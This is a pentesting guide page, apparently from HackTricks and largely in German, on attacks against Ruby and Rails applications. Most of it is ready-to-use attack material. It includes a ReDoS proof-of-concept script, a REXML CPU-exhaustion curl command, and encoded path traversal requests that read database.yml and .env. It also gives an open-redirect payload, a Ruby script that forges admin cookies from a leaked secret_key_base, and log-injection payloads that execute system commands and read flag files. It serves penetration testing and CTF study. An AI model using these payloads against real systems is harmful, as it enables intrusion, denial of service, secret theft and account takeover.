# Ruby Tricks

{{#include ../../banners/hacktricks-training.md}}

## Datei-Upload zu RCE

Wie in [diesem Artikel](https://www.offsec.com/blog/cve-2024-46986/) erläutert, kann das Hochladen einer `.rb`-Datei in sensible Verzeichnisse wie `config/initializers/` in Ruby on Rails-Anwendungen zu Remote Code Execution (RCE) führen.

Tipps:
- Andere Boot-/eager-load-Orte, die beim Start der App ausgeführt werden, sind ebenfalls riskant, wenn sie beschreibbar sind (z. B. ist `config/initializers/` der klassische Fall). Wenn Sie einen beliebigen Datei-Upload finden, der irgendwo unter `config/` landet und später evaluiert/required wird, können Sie beim Boot RCE erlangen.
- Suchen Sie nach dev-/staging-Builds, die user-controlled Dateien in das Container-Image kopieren, wo Rails sie beim Boot laden wird.

## Active Storage image transformation → command execution (CVE-2025-24293)

Wenn eine Anwendung Active Storage mit `image_processing` + `mini_magick` verwendet und untrusted Parameter an Bildtransformationsmethoden übergibt, könnten Rails-Versionen vor 7.1.5.2 / 7.2.2.2 / 8.0.2.1 command injection erlauben, weil einige Transformationsmethoden fälschlicherweise standardmäßig zugelassen waren.

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
wobei `params[:t]` und/oder `params[:v]` vom Angreifer kontrolliert werden.

- What to try during testing
- Identifizieren Sie Endpunkte, die variant/processing-Optionen, Transformationsnamen oder beliebige ImageMagick-Argumente akzeptieren.
- Fuzz `params[:t]` und `params[:v]` auf verdächtige Fehler oder Ausführungseffekte. Wenn Sie den Methodennamen beeinflussen oder rohe Argumente übergeben können, die MiniMagick erreichen, könnten Sie code exec auf dem Image-Processor-Host erhalten.
- Wenn Sie nur Lesezugriff auf generierte Varianten haben, versuchen Sie blindes Exfiltrieren über manipulierte ImageMagick-Operationen.

- Abhilfe/Erkennung
- Wenn Sie Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 mit Active Storage + `image_processing` + `mini_magick` und user-controlled Transformations sehen, betrachten Sie es als ausnutzbar. Empfehlen Sie ein Upgrade und das Durchsetzen strenger allowlists für Methoden/Parameter sowie eine gehärtete ImageMagick-Policy.

## Rack::Static LFI / path traversal (CVE-2025-27610)

Wenn der Ziel-Stack Rack-Middleware direkt oder über Frameworks verwendet und Versionen von `rack` vor 2.2.13, 3.0.14 und 3.1.12 eingesetzt werden, erlauben diese Local File Inclusion über `Rack::Static`, wenn `:root` nicht gesetzt oder falsch konfiguriert ist. Encodierte Traversals in `PATH_INFO` können Dateien im Arbeitsverzeichnis des Prozesses oder unter einem unerwarteten Root offenlegen.

- Suchen Sie nach Apps, die `Rack::Static` in `config.ru` oder Middleware-Stacks mounten. Versuchen Sie encodierte Traversals gegen statische Pfade, zum Beispiel:
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
Passen Sie das Prefix an, um mit den konfigurierten `urls:` übereinzustimmen. Wenn die App mit Dateiinhalten antwortet, haben Sie wahrscheinlich LFI zu allem unter dem aufgelösten `:root`.

- Abhilfe: Rack aktualisieren; sicherstellen, dass `:root` nur auf ein Verzeichnis öffentlicher Dateien zeigt und explizit gesetzt ist.

## Rack multipart parser ReDoS / request smuggling (CVE-2024-25126)

Rack < `3.0.9.1` und < `2.2.8.1` verbrachte super-lineare Zeit beim Parsen manipulierter `Content-Type: multipart/form-data`-Header. Ein einzelner POST mit einer gigantischen `A=`-Parameterliste kann einen Puma/Unicorn-Worker blockieren und DoS oder Request-Queue-Starvation verursachen.

- Quick PoC (hängt einen Worker):
```bash
python - <<'PY'
import requests
h = {'Content-Type': 'multipart/form-data; ' + 'A='*5000}
requests.post('http://target/', data='x', headers=h)
PY
```
- Funktioniert gegen jeden Rack-basierten Stack (Rails/Sinatra/Hanami/Grape). Wenn vorangestellt von nginx/haproxy mit keep-alive, wiederholen Sie parallel, um Worker zu erschöpfen.
- Gefixt durch Umstellung des Parsers auf lineare Komplexität; suchen Sie nach `rack`-Gem-Versionen < `3.0.9.1` oder < `2.2.8.1`. In Assessments darauf hinweisen, dass WAFs dies selten blockieren, weil der Header syntaktisch gültig ist.

## REXML XML parser ReDoS (CVE-2024-49761)

Die REXML-Gem < 3.3.9 (Ruby 3.1 und älter) führt katastrophales Backtracking beim Parsen hexadezimaler numerischer Zeichencodes mit langen Ziffernfolgen (z. B. `&#1111111111111x41;`) durch. Jegliches XML, das von REXML oder Bibliotheken, die es umschließen, verarbeitet wird (SOAP/XML API-Clients, SAML, SVG-Uploads), kann für CPU-Exhaustion missbraucht werden.

Minimaler Trigger gegen einen Rails-Endpunkt, der XML parst:
```bash
curl -X POST http://target/xml -H 'Content-Type: application/xml' \
--data '<?xml version="1.0"?><r>&#11111111111111111111111111x41;</r>'
```
Wenn der Prozess für Sekunden beschäftigt bleibt und die Worker-CPU stark ansteigt, ist die Anwendung wahrscheinlich verwundbar. Der Angriff benötigt wenig Bandbreite und betrifft auch Background-Jobs, die XML verarbeiten.

## CGI cookie parsing / escapeElement ReDoS (CVE-2025-27219 & CVE-2025-27220)

Apps using the `cgi` gem (default in many Rack stacks) can be frozen with a single malicious header:
- `CGI::Cookie.parse` was super-linear; huge cookie strings (thousands of delimiters) trigger O(N²) behavior.
- `CGI::Util#escapeElement` regex allowed ReDoS on HTML escaping.

Both issues are fixed in `cgi` 0.3.5.1 / 0.3.7 / 0.4.2. For pentests, drop a massive `Cookie:` header or feed not-trusted HTML to helper code and watch for worker lockup. Combine with keep-alive to amplify.

## Basecamp `googlesign_in` open redirect / cookie flash leak (CVE-2025-57821)

The `googlesign_in` gem < 1.3.0 (used for Google OAuth on Rails) performed an incomplete same-origin check on the `proceedto` parameter. A malformed URL like `proceedto=//attacker.com/%2F..` bypasses the check and redirects the user off-site while preserving Rails flash/session cookies.

Exploit flow:
1. Das Opfer klickt auf einen vom Angreifer gehosteten, manipulierten Google Sign-In-Link.
2. Nach der Authentifizierung leitet das Gem zur vom Angreifer kontrollierten Domain weiter und leakt flash notices oder beliebige Daten, die in Cookies gespeichert sind, die für die Wildcard-Domain gelten.
3. Wenn die App kurzlebige Tokens oder magic links im flash speichert, kann das zu einer Account-Übernahme führen.

During testing, grep Gemfile.lock for `googlesign_in` < 1.3.0 and try malformed `proceedto` values. Confirm via Location header and cookie reflection.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails encrypts and signs cookies using keys derived from `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), you can usually decrypt, modify, and re-encrypt cookies. This often leads to authz bypass if the app stores roles, user IDs, or feature flags in cookies.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):

<details>
<summary>Ruby zum Entschlüsseln/Fälschen von Cookies</summary>
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
</details>
Hinweise:
- Ältere Apps können AES-256-CBC und Salts `encrypted cookie` / `signed encrypted cookie` oder JSON/Marshal serializers verwenden. Passe Salts, Cipher und Serializer entsprechend an.
- Bei Kompromittierung oder während einer Sicherheitsüberprüfung rotiere `secret_key_base`, um alle bestehenden Cookies ungültig zu machen.

## Siehe auch (Ruby/Rails-specific vulns)

- Ruby deserialization and class pollution:
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Template injection in Ruby engines (ERB/Haml/Slim, etc.):
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}


## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

Wenn eine App (häufig ein einfacher Rack/Sinatra/Rails-Endpoint) sowohl:
- einen vom Benutzer kontrollierten String wortwörtlich in die Logs schreibt, und
- später eine Datei `load`t, deren Pfad aus genau diesem String abgeleitet wird (nach `Pathname#cleanpath`),

kann man oft remote code execution erreichen, indem man das Log vergiftet und die App dazu bringt, die Log-Datei mit `load` zu laden. Wichtige Primitive:

- Ruby `load` wertet den Inhalt der Ziel-Datei als Ruby aus, unabhängig von der Dateiendung. Jede lesbare Textdatei, deren Inhalt als Ruby geparst werden kann, wird ausgeführt.
- `Pathname#cleanpath` fasst `.`- und `..`-Segmente zusammen, ohne das Dateisystem zu kontaktieren, und ermöglicht path smuggling: vom Angreifer kontrollierter Müll kann zum Zwecke des Loggings vorangestellt werden, während der bereinigte Pfad trotzdem noch auf die gewünschte Datei zur Ausführung zeigt (z. B. `../logs/error.log`).

### Minimales anfälliges Muster
```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```
### Warum das Log gültigen Ruby-Code enthalten kann
`Logger` schreibt Präfixzeilen wie:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby beginnt `#` einen Kommentar und `9/2/2025` ist nur Arithmetik. Um gültigen Ruby-Code zu injizieren, müssen Sie:
- Beginnen Sie Ihre payload auf einer neuen Zeile, damit sie nicht durch das `#` in der INFO-Zeile auskommentiert wird; senden Sie eine führende neue Zeile (`\n` oder `%0A`).
- Schließen Sie die offene `[` , die durch die INFO-Zeile eingeführt wurde. Ein gängiger Trick ist, mit `]` zu beginnen und optional den Parser mit `][0]=1` zufriedenzustellen.
- Platzieren Sie dann beliebigen Ruby-Code (z. B. `system(...)`).

Beispiel dessen, was nach einer Anfrage mit einem crafted param im Log landet:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```
### Einschmuggeln eines einzelnen Strings, der sowohl Code in das Log schreibt als auch auf den Log-Pfad auflöst
Wir wollen eine vom Angreifer kontrollierte Zeichenfolge, die:
- beim Roh-Logging unseren Ruby-Payload enthält, und
- wenn sie durch `Pathname.new(<input>).cleanpath` geleitet wird, zu `../logs/error.log` auflöst, sodass das anschließende `load` die soeben vergiftete Log-Datei ausführt.

`Pathname#cleanpath` ignoriert schemes und reduziert Pfad-Traversal-Komponenten, daher funktioniert Folgendes:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- Das `#` vor `://` sorgt dafür, dass Ruby den Rest ignoriert, wenn das Log ausgeführt wird, während `cleanpath` das Suffix weiterhin auf `../logs/error.log` reduziert.
- Der führende Zeilenumbruch verlässt die INFO-Zeile; `]` schließt die offene Klammer; `][0]=1` erfüllt den Parser.

### End-to-end exploitation
1. Sende Folgendes als Namen des Backup-Skripts (URL-encodiere den ersten Zeilenumbruch als `%0A`, falls nötig):
```
\n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
```
2. Die App protokolliert deinen Rohstring in `logs/error.log`.
3. Die App berechnet `cleanpath`, das zu `../logs/error.log` auflöst und darauf `load` aufruft.
4. Ruby führt den Code aus, den du ins Log injiziert hast.

To exfiltrate a file in a CTF-like environment:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-kodiertes PoC (erstes Zeichen ist ein Zeilenumbruch):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
## Referenzen

- [Rails Sicherheitsankündigung: CVE-2025-24293 Active Storage unsichere Transformationsmethoden (behoben in 7.1.5.2 / 7.2.2.2 / 8.0.2.1)](https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670)
- [GitHub-Sicherheitshinweis: Rack::Static Local File Inclusion (CVE-2025-27610)](https://github.com/advisories/GHSA-7wqh-767x-r66v)
- [Hardware Monitor Dojo-CTF #44: Log Injection to Ruby RCE (YesWeHack Dojo)](https://www.yeswehack.com/dojo/dojo-ctf-challenge-winners-44)
- [Ruby Pathname.cleanpath Dokumentation](https://docs.ruby-lang.org/en/3.4/Pathname.html#method-i-cleanpath)
- [Ruby Logger](https://ruby-doc.org/stdlib-2.5.1/libdoc/logger/rdoc/Logger.html)
- [Wie Ruby load funktioniert](https://blog.appsignal.com/2023/04/19/how-to-load-code-in-ruby.html)
- [Rack multipart ReDoS Sicherheitshinweis (CVE-2024-25126)](https://www.cve.news/cve-2024-25126/)
- [Ruby-Sicherheitswarnungen für CGI / URI (CVE-2025-27219/27220/27221)](https://www.ruby-lang.org/en/news/2025/02/26/security-advisories/)

{{#include ../../banners/hacktricks-training.md}}
